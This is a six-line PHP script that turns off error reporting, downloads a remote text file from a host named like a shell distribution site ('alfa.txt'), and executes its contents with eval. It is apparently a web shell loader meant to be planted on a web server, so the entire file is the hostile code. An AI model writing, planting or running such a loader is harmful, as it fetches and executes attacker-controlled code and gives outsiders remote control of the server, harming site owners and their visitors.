<?php
error_reporting(0);
$url = 'https://shell.prinsh.com/Nathan/alfa.txt';
$kode = file_get_contents($url);
eval('?>' . $kode);
?>